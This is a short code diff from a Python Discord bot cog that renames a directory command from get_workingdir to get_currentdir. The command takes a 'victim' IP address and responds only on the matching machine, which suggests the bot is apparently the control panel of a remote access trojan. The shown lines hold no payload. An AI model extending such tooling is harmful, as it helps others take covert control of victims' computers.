@@ -16,7 +16,7 @@ class DirectoryCommands(commands.Cog):
             discord.Option("victim", description="IP Address of specific victim", required=True),
         ]
     )
-    async def get_workingdir(self, ctx, victim):
+    async def get_currentdir(self, ctx, victim):
         if str(victim) == str(self.ip_addr):
             await ctx.response.send_message(
                 embed=self.bot.genEmbed(
